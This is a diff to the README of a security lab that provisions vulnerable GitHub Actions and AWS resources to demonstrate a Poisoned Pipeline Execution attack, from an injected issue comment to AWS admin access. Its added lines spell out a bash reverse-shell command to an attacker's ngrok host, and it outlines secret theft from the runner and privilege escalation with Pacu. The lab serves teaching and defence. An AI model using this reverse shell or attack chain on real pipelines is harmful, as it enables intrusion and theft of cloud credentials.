@@ -3,19 +3,19 @@
 Hack your way from Github Action pipelines to AWS!
 
 ## Abstract
-This lab enables provisioning of all necessary infrastructure for demonstrating an attack scenario in which a malicious actor starts by compromising a [*Github Action*](https://github.com/features/actions), performs lateral movement across an [*AWS*](https://aws.amazon.com/) account and, eventually, escalates privileges to aws administrator.  
+This lab enables provisioning of all necessary infrastructure for demonstrating an attack scenario in which a threat actor starts by compromising a [*Github Action*](https://github.com/features/actions), performs lateral movement to an [*AWS*](https://aws.amazon.com/) account and, eventually, escalates privileges to aws administrator.  
 
 Specifically, the attack comprises the following phases:  
 
 1. Injection of a malicious comment into a Github issue to trigger a Github Action that initiates a reverse shell ([*Poisoned Pipeline Execution*](../../ci-cd/ppe/README.md)). 
 
-2. Extraction of secrets from the runner via the reverse shell, uncovering AWS keys.  
+2. Exfiltration of secrets from the action's runner via reverse shell, uncovering AWS keys.  
 
-3. Enumeration of AWS resources using the previously extracted secrets, revealing read access to the contents of an [*S3 bucket*](https://aws.amazon.com/pm/serv-s3).  
+3. Enumeration of AWS resources using the previously extracted keys, revealing read access to the contents of an [*S3 bucket*](https://aws.amazon.com/pm/serv-s3).  
 
 4. The bucket contains some files: you uncover additional AWS keys.  
 
-5. Leveraging these keys, you employ [*Pacu*](https://github.com/RhinoSecurityLabs/pacu) to perform privilege escalation and gain root access across the entire AWS account.  
+5. Leveraging these keys, you employ [*Pacu*](https://github.com/RhinoSecurityLabs/pacu) to perform privilege escalation and gain admin access across the entire AWS account.  
 
 ![attack](./images/attack.png)  
 
@@ -46,12 +46,12 @@ You will create one S3 bucket and two IAM users (along with required IAM policie
 - `vulnerable-iam-user`
 
 
-Cd to the `infra/aws` directory and create a new file called `secret.tfvars`.  
-This file will contain all the variables required to setup the github repository, as well as our aws keys (retrieved from the aws terraform step): 
+Move to the `infra/aws` directory and create a new file called `secret.tfvars`.  
+This file will contain all the variables required to setup the aws environment: 
 
 ```sh
-aws_region = "your-aws-region-here"
-s3_bucket_name ="your-aws-s3-bucket-name-for-this-demo-here"
+aws_region = "<your-aws-region-here>"
+s3_bucket_name ="<your-aws-s3-bucket-name-for-this-demo-here>"
 ```  
 
 Now you can proceed with terraform provisioning (note, you need to have aws cli already installed and configured with sufficient rights for this step).  
@@ -67,7 +67,7 @@ Now launch a terraform plan by specifying the secret's file:
 terraform plan -var-file="secret.tfvars"
 ```  
 
-The plan should look similar to this:  
+The plan should look similar to this one:  
 ```sh
   # aws_iam_access_key.ppe_s3_readonly_access_key will be created
   + resource "aws_iam_access_key" "ppe_s3_readonly_access_key" {
@@ -241,7 +241,7 @@ vulnerable_iam_access_key_secret = <sensitive>
 ```  
 
 Now you need to add the keys for the `vulnerable-iam-user` inside the local `repo-content` folder.  
-In order to do that, open the `terraform.tfstate` file, retrieve both the access key id and access key value for the `vulnerable-iam-user`  
+In order to do that, open the `terraform.tfstate` file, retrieve both the access key ID and access key value for the `vulnerable-iam-user`  
 and put them inside a file called `aws_keys.txt` inside the `repo-content` directory.  
 
 Now is time to push that directory to the S3 bucket you created:  
@@ -270,14 +270,14 @@ This will create a repository with a Github Action that automatically prints the
 **Note**: for security reasons you will make the repository private but the same attack can be carried out against public repositories!  
 This is what make this type of attack so dangerous: **the threat actor only needs to write a comment!**  
 
-Cd to the `infra/github` directory and create a new file called `secret.tfvars`.  
+Move to the `infra/github` directory and create a new file called `secret.tfvars`.  
 This file will contain all the secrets required to setup the github repository, as well as the aws keys for the `ppe-s3-readonly-user` (retrieved from the aws terraform step): 
 
 ```sh
-gh_owner = "your-github-account-or-org-here"
-gh_token="your-github-pat-here"
-github_actions_secret_aws_key_id="your-aws-secret-key-id-here"
-github_actions_secret_aws_key_value="your-aws-secret-key-value-here"
+gh_owner = "<your-github-account-or-org-here>"
+gh_token="<your-github-pat-here>"
+github_actions_secret_aws_key_id="<your-aws-secret-key-id-here>"
+github_actions_secret_aws_key_value="<your-aws-secret-key-value-here>"
 ``` 
 
 Init the terraform module:  
@@ -292,7 +292,7 @@ Now launch a terraform plan by specifying the secret's file:
 terraform plan -var-file="secret.tfvars"
 ```  
 
-The plan should look similar to this:  
+The plan should look similar to this one:  
 
 ```sh
 Terraform will perform the following actions:
@@ -434,6 +434,7 @@ Create a new issue on that repo:
 
 Now you can proceed with the attack! 💪
 
+<br/>
 
 ## ATTACK DEMONSTRATION 
 
@@ -441,7 +442,7 @@ Add a new comment to the issue:
 
 ![first-comment](./images/first-comment.png)  
 
-and observe that the github action has been triggered by your comment:  
+Observe that the github action has been triggered by your comment:  
 ![first-action](./images/first-action.png)  
 
 
@@ -490,7 +491,9 @@ jobs:
           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
 ```  
 
-and you notice that they are echoing the content of the issue body (`${{ github.event.comment.body }}`) without sanitizing it!  
+and you notice that they are echoing the content of the issue body (`${{ github.event.comment.body }}`) without sanitizing it! 
+
+Maybe there is a way to pipe malicious commands by simply commenting on that issue 🤔  
 
 At this point you can proceed to poison the execution 😈  
 
@@ -517,7 +520,25 @@ Our payload will be:
 
 ![evil-comment](./images/evil-comment.png)  
 
-This will trigger the github action and open a reverse shell from within the github runner, back to your local machine!  
+
+This command sets up a reverse shell from a target machine (github action runner) to a listening server (the attacker's machine).   
+Let's break down what each part of the command does:
+
+ 
+1. `bash -i`: Launches an interactive Bash shell (`-i` flag).
+ 
+2. `>& /dev/tcp/<NGROK-IP-HERE>/<NGROK-PORT-HERE>`: Redirects both stdout and stderr of the Bash shell to a TCP connection to `<NGROK-IP-HERE>` on `<NGROK-PORT-HERE>`.  
+  Here's how this redirection works:  
+  - `>&` combines the stdout (`1`) and stderr (`2`) streams.
+ 
+  - `/dev/tcp/<NGROK-IP-HERE>/<NGROK-PORT-HERE>` is a special device in Unix-like systems that allows Bash to open a TCP connection to `<NGROK-IP-HERE>` at `<NGROK-PORT-HERE>`.
+ 
+3. `0>&1`: Redirects stdin (file descriptor `0`) to the same place as stdout (file descriptor `1`). This ensures that all input and output from the Bash shell session are sent over the network connection established with NGROK.
+
+
+
+Now you have a remote shell on the runner!  
+
 
 ```console
 listening on [any] 1337 ...
